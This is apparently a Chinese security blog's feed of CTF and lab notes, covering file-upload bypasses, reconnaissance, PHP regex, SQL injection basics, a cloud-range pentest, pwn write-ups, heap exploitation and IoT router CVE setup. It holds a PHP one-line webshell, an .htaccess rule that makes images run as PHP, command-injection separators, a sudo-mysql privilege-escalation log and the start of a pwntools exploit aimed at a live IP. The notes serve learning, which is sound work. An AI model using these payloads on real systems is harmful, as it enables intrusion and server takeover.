X-Forwarded-For: , , 很详细的讲述了XFF的 参考文章 讲述了XFF与XRI区别的 参考文章</content></entry><entry><title>文件上传</title><url>/post/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url><categories><category>WEB</category><category>WEB笔记</category></categories><tags><tag>文件上传</tag></tags><content type="html"><![CDATA[  [TOC] 一篇很详细的参考博客 原理 在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。 文件上传漏洞对Web应用来说是一种非常严重的漏洞。一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。 存在文件上传功能的地方都有可能存在文件上传漏洞，比如相册、头像上传，视频、照片分享。论坛发帖和邮箱等可以上传附件的地方也是上传漏阔的高危地带，另外像文件管理器这样的功能也有可能被攻击者所利用。 前端检测 个人理解就是因为它是在前端进行检测，检测过了就可以传到服务器，所以只要把前端的检测一绕过就文件上传了 后端检测_后缀名检测漏洞 就是会对文件后缀名进行检测，所以文件上传很多都是上传一个图片马和.htaccess，除非这里可以直接利用大小写或者php4这种东西绕过
这个会配合.htaccess使用，上传一个图片马，然后上传一个.htaccess文件，这样就可以把图片马解析成php 黑白名单的内容了解即可
黑名单 白名单 后端检测_00截断 这个还不是很懂，感觉用处也不大 后端检测_MIME检测 其实就是改content-type字段 后端检测_文件头检测漏洞 比如常见的GIF89a,而且这个不能在png里面加，要在burp里面加 上传图片马 copy 1.png/b + sh.php/a sh.png ,但是发现这个不好用 这里不知道为什么被吞了一个&lt;,导致无法正常解析.php文件 还是用magic number顺手直接上传了图片马 解析漏洞 .htaccess 一般会配合图片马然后打白名单 &lt;FilesMatch &#34;shell.png&#34;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; Apache apache会从右往左解析后缀 IIS6.0解析漏洞 这个不是很常见见到了再说 IIS7.0 | IIS7.5 | Nginx的解析漏洞 没见过 &lt;?过滤 猜测是对一句话木马的&lt;?过滤，那么我们修改为js马
&lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;   ]]></content></entry><entry><title>信息收集</title><url>/post/web/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url><categories><category>WEB</category><category>WEB笔记</category></categories><tags><tag>WEB信息收集</tag></tags><content type="html"> js不让看源代码，本质是js的原因 可以直接view-source:url这种形式查看源代码，或者ctrl+u查看源代码 url/robots.txt url/index.phps url/www.zip 版本控制 url/.git url/.svn 根据提示，在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件。第一次意外退出生成的是.swp。第二次意外退出生成的是.swo。第三次为.swn cookie会隐藏信息 域名也可以隐藏信息 查询域名解析地址 基本格式：nslookup host [server] 查询域名的指定解析类型的解析记录 基本格式：nslookup -type=type host [server] 查询全部 基本格式：nslookup -query=any host [server] 编辑nslookup -query=any flag.ctfshow.com 有时候网站上的公开信息，就是管理员常用密码 抓包，f12,dirsearch一键三连 默认探针 tz.php url/backup.sql dirsearch在信息收集中比较好用</content></entry><entry><title>常见问题</title><url>/post/web/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url><categories><category>WEB</category><category>WEB笔记</category></categories><tags><tag>WEB</tag></tags><content type="html"> dirsearch扫目录很慢,参考 这篇文章 。但是扫太快也会有问题，服务器无法一时间接受那么多请求</content></entry><entry><title>tricks</title><url>/post/web/tricks/</url><categories><category>WEB</category><category>WEB笔记</category></categories><tags><tag>WEB</tag></tags><content type="html"> 有的题目直接给了个一个可以输入命令的东西，可以尝试用&amp;amp;,|,\n这种进行命令执行 尝试多种编码格式进行绕过，比如\n可以换成%0a,\n还可以替换成\t,%09 如果是js前端的题，可以直接在控制台修改对应的值</content></entry><entry><title>php语法特性</title><url>/post/php/php%E8%AF%AD%E6%B3%95%E7%89%B9%E6%80%A7/</url><categories><category>WEB</category><category>PHP</category></categories><tags><tag>php</tag></tags><content type="html"><![CDATA[  preg_match() preg_match(pattern, subject)是 PHP 中用于执行正则表达式匹配的函数，它的基本语法如下：
pattern：正则表达式，用于定义要匹配的模式。 subject：要检查的字符串（在你的例子中是 $a）。 返回值：如果找到匹配，返回 1。如果未找到匹配，返回 0。如果发生错误，返回 false。
/ ... /：正则表达式的分隔符，定义了要匹配的模式。 i：修饰符，表示正则表达式是大小写不敏感的（即不区分大小写）。 常见需要转义的特殊字符 以下是正则表达式中具有特殊含义的字符，如果你想匹配它们的字面值，必须用 \ 转义。在 PHP 中，这些字符需要写成 \\ 来匹配它们的字面值： 字符	特殊含义	用途 .	匹配任意字符（除了换行符）	匹配任意单个字符 ^	匹配字符串的开头	用于匹配字符串的起始位置 $	匹配字符串的结尾	用于匹配字符串的末尾 *	匹配前面的字符 0 次或多次	用于量化符号，表示可以重复的字符或模式 +	匹配前面的字符 1 次或多次	表示至少重复一次的字符或模式 ?	匹配前面的字符 0 次或 1 次	表示字符或模式是可选的 []	字符集，用来表示一组可能的字符	匹配括号内的任意字符 {}	限定符，用来表示前面的字符的重复次数	指定字符或模式出现的次数 ()	捕获组，用于将一部分正则表达式括起来作为一个整体	捕获匹配的子表达式 `	`	逻辑 &amp;#34;或&amp;#34;，匹配左边或右边的表达式 \	转义字符，允许将特殊字符作为普通字符处理	用来转义正则表达式中的特殊字符 /	正则表达式的分隔符（在正则表达式的起始和结束位置）	PHP 中正则表达式分隔符，不是特殊字符 正则表达式 /[a-zA-Z]{6}/ [a-zA-Z]：表示匹配任何英文字母字符，既包括小写字母 (a-z)，也包括大写字母 (A-Z)。 {6}：表示正好匹配 6 个字符。 因此，正则表达式 /[a-zA-Z]{6}/ 的含义是匹配由 6 个连续的字母（大小写皆可）组成的字符串。
$a = @$_POST[&amp;#39;a&amp;#39;]; $key = @preg_match(&amp;#39;/[a-zA-Z]{6}/&amp;#39;, $a); @：在 PHP 中，@ 操作符用于隐藏错误消息。
$a = @$_POST[&#39;a&#39;];：将表单提交的 POST 请求 …  ]]></content></entry><entry><title>sql注入初探</title><url>/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/</url><categories><category>WEB</category><category>SQL注入</category></categories><tags><tag>SQL注入</tag></tags><content type="html"><![CDATA[  [TOC]
sql常见函数 CONCAT CONCAT：字符串拼接,用于将两个或多个字符串连接起来，返回一个组合后的新字符串。 CONCAT(string1, string2, ..., stringN) SUBSTR SUBSTR / SUBSTRING：提取子字符串,用于从一个字符串中提取子字符串。 SUBSTR(string, start_position, length) string：要操作的字符串。 start_position：开始提取的起始位置（1 表示字符串的第一个字符）。 length：可选，表示要提取的字符数量。如果省略，则提取到字符串的末尾。 示例：
SELECT SUBSTR(&amp;#39;Hello World&amp;#39;, 7, 5) AS substring; 结果：
substring --------- World 这个例子从 Hello World 的第 7 个字符开始提取，长度为 5 个字符，即提取出 World。
GROUP_CONCAT GROUP_CONCAT 是 SQL 中的一个聚合函数，常用于将分组的结果集中的多个值连接成一个字符串。它会将分组后的多行数据合并为一行，并以指定的分隔符连接起来，通常与 GROUP BY 子句一起使用。
作用：将一组值（通常是来自同一个分组的多个行）连接成一个字符串，并用指定的分隔符分隔这些值。
语法 GROUP_CONCAT([DISTINCT] expression [ORDER BY expression ASC|DESC] [SEPARATOR &amp;#39;separator&amp;#39;]) DISTINCT：可选，用于去重。 expression：要连接的字段或表达式。 ORDER BY：可选，用于指定连接结果的排序方式。 SEPARATOR：可选，指定连接时使用的分隔符，默认为逗号（,）。
示例用法 简单使用 GROUP_CONCAT,假设有一个 students 表，包含 class 和 name 字段： SELECT class, GROUP_CONCAT(name) AS student_names FROM students GROUP BY class; class student_names ------- ------------------- 1 …  ]]></content></entry><entry><title>春秋云境 Initial</title><url>/post/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/</url><categories><category>渗透</category></categories><tags><tag>渗透</tag></tags><content type="html"> 第一次玩渗透，玩的春秋云镜最简单的一个，做一下笔记
第一阶段 打开题目给了个外网url，肯定是先扫看看有什么开着的服务，有如下两种方式
nmap 第一种用nmap,最常见的一种用法如下 nmap –sT –sV -O url (-p &amp;amp;hellip;)
fscan 第二种是用fscan，有时候它能直接扫出存在的cve，最常见的使用方法如下 .\fscan.exe -h url
flag1 fscan扫出来直接就有ThinkPHP 5.0.23的一个RCE漏洞，直接用工具打。 ThinkphpGUI 打完之后就会给一个url和一个pass,用这个url和pass可以直接用蚁剑连接上去。然后查看当前权限
(www-data:/var/www/html) $ whoami www-data (www-data:/var/www/html) $ uname -a Linux ubuntu-web01 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux (www-data:/var/www/html) $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) (www-data:/var/www/html) $ sudo -l Matching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql 这说明我们可以通过通过sudo高权限运行mysql，进而能够执行 root权限才能执行的命令，可以参考下面这篇文章，里面也有讲很多种提取的方法渗透测试： Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权 这样就获 …</content></entry><entry><title>Github使用笔记</title><url>/post/%E7%AC%94%E8%AE%B0/github%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url><categories><category>笔记</category></categories><tags/><content type="html"><![CDATA[   git clone失败，一般是本机和github没有建立起联系，需要添加ssh key ssh-keygen -t rsa -b 4096 -C &#34;1249814975@qq.com&#34; clip &lt; ~/.ssh/id_rsa.pub #将生成的 SSH 公钥复制到剪贴板 #登录 GitHub，进入 Settings &gt; SSH and GPG keys，点击 New SSH Key，将复制的公钥粘贴到表单中，点击 Add SSH Key。 我非常喜欢的一种方式就是先git clone项目到本地，然后这时候就会有git标识，这时候你修改，添加都会显示,然后
git add . git commit -m &#34;commit&#34; git push origin main 就可以完成上传，非常简单
github上传目录创建问题，会根据相对.git的路径来创建。比如.git在根目录，然后你cd aaa/bbb然后git add .,git commit 再git push ，那么这个文件的目录会是aaa/bbb/。但是如果你cd aaa/bbb来git add .，然后cd ../..到根目录，然后再git commit和git push，那么github显示的东西就会是在根目录中
有时候通过https来git clone别人的仓库很可能出现网络问题，可以先fork到自己仓库然后再通过ssh来git clone即可
  ]]></content></entry><entry><title>GZCTF平台搭建运维</title><url>/post/%E7%AC%94%E8%AE%B0/gzctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E8%BF%90%E7%BB%B4/</url><categories><category>笔记</category></categories><tags/><content type="html"> 平台启动 平台启动，直接抄的 这个作业 docker镜像源我用的这个https://dockerproxy.1panel.live
中途会遇到一些问题 用docker info看一下 发现了10.201.66.142:20171这个相同的东西
询问GPT得知检查并修改/etc/systemd/system/docker.service.d/或/etc/systemd/system/docker.service.d/http-proxy.conf 文件。如果该文件中有代理设置，可以将其删除或注释掉。
注释之后记得systemctl restart docker.service,不然不会更新修改
管理员 按道理说应该是自动有个admin，但是这里不知道为什么没有，但是可以直接修改数据库，给自己一个admin权限，参考 官方文档 赛题部署 pwn的题注意要有如下init，不然缓冲区会卡住
void init() { setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } 对于docker的设置，用如下方式。用docker.starsparkle.cn而不是dockerproxy.1panel.live，发现前面的源与dockerhub同步较快，后面的同步较慢 但是后来发现一个很离谱的事，通过GZCTF那个容器接口开启测试后，相当于主机自己从dockerhub来pull东西到本地，所以即使我修改了docker，重新传到了dockerhub，但是GZCTF平台再次开启容器默认先从本地找，而不是从dockerhub重新pull，所以我这个一直没更新，我还以为题目docker打错了 所以docker.starsparkle.cn和dockerproxy.1panel.live都可以用。但是如果修改了docker记的在本机删除原本存在的镜像!!!
GZCTF平台的简单二次开发 主要是我们校赛想要加个强武先锋模块，但是平台没有这些，只能自己加，一个简单的方式是替换原有模块，这样就改个名字，图标就可以了，所以就把blockchain这个给替换成qwxf了
怎么修改呢，先通过grep查找字符串 通过类比的方式把这些字符串替换为相应的qwxf字符串，记住一定要类比， …</content></entry><entry><title>SCTF2024</title><url>/post/wp%E5%90%88%E9%9B%86/sctf2024/</url><categories><category>WP合集</category></categories><tags/><content type="html"><![CDATA[  [TOC]
factory 题目内容如下 没细看根本没有看出来漏洞，好像就是输入n，然后用alloca来调整栈空间，把数据读到栈上，然后printf打印这些值的和
但是注意到一个很奇怪的地方 v0 = 0x10 * ((4 * n + 0x17) / 0x10uLL); 为什么v0不是8*n，64位条件下，栈应该是8字节对齐
计算发现一些问题 size不严格。因此n=0x28时，实际上应该时alloca(0x140)，但这样计算只有0xb0，因此有溢出 因此有如下利用思路
这里的栈溢出可以覆盖到buf和i的值
第一个思路是覆盖buf为一个任意地址，那么就可以任意地址写任意值，但是这里无法控制返回地址，所以放弃这个思路。
第二个思路就是这个覆盖会先覆盖到i的值，再覆盖到buf的值，所以可以覆盖i为一个特别的值，跳过对buf的覆盖，这样就可以通过栈溢出覆盖到返回地址，进而就行ret2libc就行,更具体地可以看exp中的注释
exp from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 from pwn import * from ctypes import * context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;) # p = process(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;) # p=gdb.debug(&amp;#34;/home/zp9080/PWN/pwn&amp;#34;,&amp;#39;b *0x4013D2&amp;#39;) p=remote(&amp;#39;1.95.81.93&amp;#39;,57777) # …  ]]></content></entry><entry><title>内核编译</title><url>/post/%E7%AC%94%E8%AE%B0/%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/</url><categories><category>笔记</category></categories><tags/><content type="html"> 编译指令 make clean make mrproper # 可选 make menuconfig #直接save然后exit就行,反正也不会别的配置 make -j$(nproc) make modules -j$(nproc) sudo make modules_install sudo make install
遇到的问题及解决 make前的建议，把磁盘空间搞大一点。不然调整磁盘空间重启后make的进度就没了，又要重新make花很多时间。
编译内核报错 No rule to make target ‘debian/canonical-certs.pem‘ 或 ‘canonical-revoked-certs.pem‘ 的解决方法 参考博客 vmware虚拟机磁盘空间不足No space left on device 参考博客 你在编译内核时遇到了以下错误：pahole: .tmp_vmlinux.btf: No such file or directory和.btf.vmlinux.bin.o: file not recognized: file format not recognized，可以这样解决
sed -i &amp;#39;s/CONFIG_DEBUG_INFO_BTF=y/CONFIG_DEBUG_INFO_BTF=n/&amp;#39; .config qemu启动kernel 需要编译内核后的arch/x86/boot/bzImage 需要busybox制作一个.img文件,busybox只是可以提供非常轻量化的所必备的bin文件，最终目的是通过busybox来制作一个.img文件 参考文章 遇到end Kernel panic - not syncing: Requested init /linuxrc failed (error -2). 说明编译busybox时要静态链接 参考博客</content></entry><entry><title>libc2.27下的house of orange+house of apple2</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc2.27%E4%B8%8B%E7%9A%84house-of-orange+house-of-apple2/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>libc2.27下的house of orange+house of apple2</tag></tags><content type="html"><![CDATA[  前言 malloc_assert在libc2.23与libc2.27的不同 glibc source https://elixir.bootlin.com/glibc/ static void __malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function) { (void) __fxprintf (NULL, &amp;#34;%s%s%s:%u: %s%sAssertion `%s&amp;#39; failed.\n&amp;#34;, __progname, __progname[0] ? &amp;#34;: &amp;#34; : &amp;#34;&amp;#34;, file, line, function ? function : &amp;#34;&amp;#34;, function ? &amp;#34;: &amp;#34; : &amp;#34;&amp;#34;, assertion); fflush (stderr); abort (); } 主要是abort的不同
libc2.23,可以看到abort函数中还有处理IO相关的函数，因此常见的house of orange都是在glibc2.23的情况下使用 void abort (void) { struct sigaction act; sigset_t sigs; /* First acquire the lock. */ __libc_lock_lock_recursive (lock); /* Now it&amp;#39;s for sure we are alone. But recursive calls are possible. */ /* Unlock SIGABRT. */ if (stage == 0) { ++stage; if (__sigemptyset (&amp;amp;sigs) == 0 &amp;amp;&amp;amp; __sigaddset (&amp;amp;sigs, SIGABRT) == 0) __sigprocmask (SIG_UNBLOCK, &amp;amp;sigs, (sigset_t *) NULL); } /* Flush all streams. We cannot close them now because the user …  ]]></content></entry><entry><title>llvm中ll文件解读</title><url>/post/llvm-pwn/llvm%E4%B8%ADll%E6%96%87%E4%BB%B6%E8%A7%A3%E8%AF%BB/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"> [TOC] ll文件解析 ll文件中常见变量的理解 @ - 全局变量 % - 局部变量 alloca - 在当前执行的函数的堆栈帧中分配内存，当该函数返回到其调用者时，将自动释放内存 i32 - 32位4字节的整数 align - 对齐 load - 读出，store写入 icmp - 两个整数值比较，返回布尔值 br - 选择分支，根据条件来转向label，不根据条件跳转的话类型goto label - 代码标签 call - 调用函数 例题WMCTF-2024 babysigin 很重要的一些理解 CallInst：函数类型的变量 LoadInst：ll中应对应load指令 StoreInst：ll中应对应store指令 llvm::dyn_cast&amp;amp;lt;llvm::GlobalVariable/LoadInst/StoreInst,llvm::Value&amp;amp;gt;：这种就是判断其是否是GlobalVariable/LoadInst/StoreInst类型 有关LoadInst 发现想要满足LoadInst类型，那么传入的不应该是个直接的值，而是先int cmd=1234,func(cmd)用这种方式传参即可 再详细解释一下LoadInst，比如我的exp.c中是这样的
WMCTF_WRITE(0x8888); 那么ll文件就会是这样,显然不满足load
call void @WMCTF_WRITE(i32 noundef 34952) 但如果先定义一个变量再传参
int cmd = 0x8888; WMCTF_WRITE(cmd); 那么ll文件就长这样
@cmd = dso_local global i32 34952, align 4 %1 = load i32, i32* @cmd, align 4 call void @WMCTF_WRITE(i32 noundef %1) 显然这样就满足load类型了！！！
有关StoreInst 这部分和LoadInst类似，可以在WMCTF_OPEN分析中的最后一关这部分看到如何解决 这里先看简单的 WMCTF_OPEN 和 WMCTF_READ v77 = …</content></entry><entry><title>goahead源码阅读</title><url>/post/iot/goahead%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url><categories><category>IOT</category></categories><tags><tag>IOT</tag></tags><content type="html"> goahead固件分析 websDefineAction goahead开发 goahead最详细分析</content></entry><entry><title>arm环境搭建</title><url>/post/iot/arm%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url><categories><category>IOT</category></categories><tags><tag>IOT</tag></tags><content type="html"><![CDATA[  mips架构的环境还是很好搭建的，arm架构环境的搭建踩了很多坑，这里做一下记录
参考文章 疑难杂症 这两篇文章主要是教如何搭建摄像头的arm环境，搞得好麻烦。
先是下载linux kernel源码然后make,得到zImage,dtb。然后又下载busybox源码，依据这个制作sd。文章确实都很好，但是和我们最初想要实现漏洞利用的环境搭建并不密切相关。
解压kernel源码 tar -xf linux-5.10.209.tar.xz
修改顶层Makefile的ARCH和CROSS_COMPILE, 修改完后如下 377 ARCH ?= arm 378 CROSS_COMPILE ?= arm-linux-gnueabi-
配置单板的defconfig，生成.config ~/linux-5.10.209$ make vexpress_defconfig
编译kernel内核 编译完的zImage存放在arch/arm/boot/下面 ~/linux-5.10.209$ make zImage -j8
编译kernel modules 编译完的ko文件存放在arch/arm/boot/下面 ~/linux-5.10.209$ make modules -j8
编译设备树 ~/linux-5.10.209$ make dtbs
生成sd
[ -e tty1 ] &amp;&amp; sudo rm -f tty1 [ -e tty2 ] &amp;&amp; sudo rm -f tty2 [ -e tty3 ] &amp;&amp; sudo rm -f tty3 [ -e tty4 ] &amp;&amp; sudo rm -f tty4 [ -e console ] &amp;&amp; sudo rm -f console [ -e null ] &amp;&amp; sudo rm -f null sudo rm -rf rootfs mkdir rootfs cd rootfs sudo mkdir lib proc sys dev etc etc/init.d sudo touch etc/init.d/rcS sudo chmod 0777 etc/init.d/rcS; sudo echo &#34;#!/bin/sh&#34; &gt;&gt; etc/init.d/rcS sudo echo &#34;mount -t proc none /proc&#34; &gt;&gt; etc/init.d/rcS sudo echo &#34;mount -t sysfs none /sys&#34; &gt;&gt; etc/init.d/rcS sudo echo &#34;mount -t tmpfs none /dev&#34; &gt;&gt; etc/init.d/rcS sudo echo &#34;/sbin/mdev -s&#34; &gt;&gt; etc/init.d/rcS sudo chmod 0755 etc/init.d/rcS; cd .. # cp -r /usr/arm-linux-gnueabi/lib/ rootfs/lib/ cp -r /usr/arm-linux-gnueabi/lib/* rootfs/lib/ cp -r busybox-1.36.1/_install/* rootfs cp -r /home/zp9080/vexpress/squashfs-root rootfs sudo mknod -m 666 rootfs/dev/tty1 c 4 1 sudo mknod -m 666 rootfs/dev/tty2 c 4 2 sudo mknod -m 666 rootfs/dev/tty3 c 4 3 sudo mknod -m 666 rootfs/dev/tty4 c 4 4 sudo mknod -m 666 rootfs/dev/console c 5 1 sudo mknod -m 666 rootfs/dev/null c 1 3 dd if=/dev/zero of=rootfs.ext4 bs=1M count=256 mkfs.ext4 rootfs.ext4 sudo mount -t ext4 rootfs.ext4 /mnt -o loop cp -r rootfs/* /mnt umount /mnt 启动qemu
qemu-system-arm -M vexpress-a9 \ -m 512M \ -kernel ./linux-5.10.209/arch/arm/boot/zImage \ -dtb ./linux-5.10.209/arch/arm/boot/dts/vexpress-v2p-ca9.dtb \ -nographic \ -append &#34;root=/dev/mmcblk0 rw console=ttyAMA0 rootwait rootfstype=ext4&#34; \ -sd rootfs.ext4 \ -net nic -net tap,ifname=tap0,script=no,downscript=no 上述步骤完成后确实可以得到一个arm环境，但是busybox太轻量级，总之很不好用，最后这样解决
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2 wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress #通过qemu启动配置完成的Debian-armhf系统 sudo qemu-system-arm \ -M vexpress-a9 \ -kernel vmlinuz-3.2.0-4-vexpress \ -initrd initrd.img-3.2.0-4-vexpress \ -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \ -append &#34;root=/dev/mmcblk0p2 console=ttyAMA0&#34; \ -net nic -net tap,ifname=tap0,script=no,downscript=no \ -nographic 搭建企业级路由器Tenda-G3v3.0 V15.11.0.20时遇到了一些问题，这样解决的 main 125: g_lan_ip = 0 goahead: 0: Unable to open socket on port 80.
经过逆向分析与溯源，通过以下方式解决 主要是g_lan_ip的值不对，导致建立socket的时候解析都出错了，但是由于是虚拟环境所以GetValue值不对，所以想着直接控制g_lan_ip的值，通过patch解决了这个问题，这个真的困扰了我很久，因为溯源这个过程很考验能力，也得靠点猜测
  ]]></content></entry><entry><title>第四届长城杯网络安全大赛暨京津冀网络安全技能竞赛初赛</title><url>/post/wp%E5%90%88%E9%9B%86/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/</url><categories><category>WP合集</category></categories><tags/><content type="html"><![CDATA[  FlowerShop [*] &amp;#39;/home/zp9080/PWN/pwn&amp;#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 发现buf这里有溢出，可以控制v8,v8就是之后的money值 personalShop这个函数没什么用，就是打印你所有的物品和money shop函数,当买999物品会让magic为/bin/sh，然后买两个99，一个199的，在check函数中可以让v3为70，最终实现栈溢出 int __fastcall shop(unsigned int *a1, unsigned int *cnt) { int result; // eax int v3; // [rsp+1Ch] [rbp-14h] BYREF char buf[10]; // [rsp+20h] [rbp-10h] BYREF char v5; // [rsp+2Ah] [rbp-6h] BYREF char v6; // [rsp+2Bh] [rbp-5h] int i; // [rsp+2Ch] [rbp-4h] v5 = &amp;#39;0&amp;#39;; v3 = 0xA; for ( i = 0; i &amp;lt;= 9; ++i ) buf[i] = 0; do { puts(asc_401048); puts(asc_4010F8); __isoc99_scanf(&amp;amp;unk_401118, &amp;amp;v5); do v6 = getchar(); while ( v6 != -1 &amp;amp;&amp;amp; v6 != &amp;#39;\n&amp;#39; ); switch ( v5 ) { case &amp;#39;b&amp;#39;: if ( (int)cnt[1] &amp;gt; 8 ) goto LABEL_18; if ( (unsigned int)pay(199, a1) ) ++cnt[1]; break; case &amp;#39;c&amp;#39;: if ( (int)cnt[2] &amp;gt; 8 ) { LABEL_18: puts(asc_401120); break; } if ( (unsigned …  ]]></content></entry><entry><title>杂记</title><url>/post/%E7%AC%94%E8%AE%B0/%E6%9D%82%E8%AE%B0/</url><categories><category>笔记</category></categories><tags/><content type="html"> wsl中想要使用docker，需要在windows中打开docker desktop。而且wsl用docker会遇到好多问题，建议不用 ubuntu懒得换源，可以这样做 docker pull doneme123/emtaint:v1.1 docker save -o emtaint_v1.1.tar doneme123/emtaint:v1.1 docker load -i emtaint_v1.1.tar</content></entry><entry><title>IOT入门CVE复现</title><url>/post/iot/iot%E5%85%A5%E9%97%A8cve%E5%A4%8D%E7%8E%B0/</url><categories><category>IOT</category></categories><tags><tag>IOT</tag></tags><content type="html"><![CDATA[  写在前面 复现这些很老的cve就不用追求细节了，把整体过程过一遍就行了 华为HG532系列路由器命令注入漏洞复现CVE-2017-17215 环境搭建是看的这篇文章 cve复现过程根据这篇文章 除了binwalk还要记得下载 sasquatch安装：https://github.com/devttys0/sasquatch
因为这个cve很旧，我用的u20虚拟机firefox支持的协议版本还比较高，所以不支持访问，询问GPT得到结果
你遇到的错误是因为浏览器和服务器之间使用的加密协议不兼容。根据错误信息，服务器可能不支持现代的安全协议，如 TLS 1.2 或更高版本，而 Firefox 强制使用 TLS 1.2 及以上的协议。 尝试降低浏览器的 TLS 版本要求（不推荐长期使用，只作临时排查）： 在 Firefox 的地址栏中输入 about:config，并按回车键。 你会看到警告页面，点击“我接受风险！”。 搜索 security.tls.version.min。 将该值设置为 1，这意味着最低支持的协议将是 TLS 1.0。 尝试重新访问该页面。 注意：降低 TLS 版本可能带来安全风险，因为旧版本的协议已被发现存在漏洞，因此建议仅作为临时解决方案。 ROPing Routers from scratch: Step-by-step Tenda Ac8v4 Mips 0day Flow-control ROP -&amp;gt; RCE 参考博客 参考博客 第一个问题，卡在这个循环，直接patch掉即可 Well, if you search for string &amp;lsquo;welcome&amp;rsquo; in IDA, you cross-reference the string which will takes you to main()! and the cause of this is located at ifaddrs_get_ifip() (You should see something similar to this):
puts(&amp;#34;\n\nYes:\n\n ****** WeLoveLinux****** \n\n ****** Welcome to ******&amp;#34;); setup_signals(); while ( 1 ) { …  ]]></content></entry><entry><title>路由器环境配置</title><url>/post/iot/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url><categories><category>IOT</category></categories><tags><tag>IOT</tag></tags><content type="html"> 网桥 网桥（Bridge）在网络中类似于一个虚拟的交换机，能够连接多个网络接口，使这些接口位于同一个局域网内，可以相互通信。在虚拟化环境中，网桥常用于将虚拟机的网络接口与主机的网络接口连接起来，从而使虚拟机和主机能够在同一个网络中相互通信。
网桥相关的概念解释
什么是网桥（Bridge）？ 网桥是一个用于连接多个网络接口的设备（或者说是逻辑设备）。通过网桥，多个网络接口可以共享同一个网络，使得这些接口可以像处于同一物理局域网（LAN）中一样互相通信。对于虚拟机环境而言，网桥允许虚拟机通过主机的网络设备访问外部网络或与主机通信。
为什么需要网桥？ 在虚拟化环境中，例如 QEMU 中，虚拟机默认是隔离的，如果希望虚拟机能够和主机以及外部网络通信，就需要建立一条网络连接。网桥可以实现虚拟机和主机的网络互通，使虚拟机能够使用主机的网络接口，与外部设备通信，或者与其他虚拟机通信。
具体步骤中的网桥配置说明
安装网络桥接工具 sudo apt-get install bridge-utils bridge-utils 是管理网桥的工具集，它提供了创建、删除和管理网桥的命令（如 brctl 命令）。
创建网桥 Virbr0 sudo brctl addbr Virbr0 brctl addbr 是用于创建一个新的网桥的命令。 Virbr0 是你为这个网桥命名的名字（你可以取其他名称，但为了规范和清晰，通常用 Virbr 或 br0 这样的名字）。 网桥的作用：将虚拟机和主机的网络设备（如 tap 设备或物理网卡）连接在一起，让它们处于同一个局域网中。
为网桥分配 IP 地址并启用 sudo ifconfig Virbr0 192.168.50.51/24 up ifconfig 是用于配置网络接口的命令。 Virbr0 是刚才创建的网桥接口。 192.168.50.51/24 是为这个网桥分配的 IP 地址（这里假设你的局域网是 192.168.50.x 网段）。 up 表示启用该接口。
为什么要为网桥分配 IP？ 虽然网桥本身不需要参与通信，但如果你想通过主机与虚拟机通信，就需要为网桥分配一个 IP 地址，这样你就可以在主机上通过该 IP 地址与虚拟机通信。
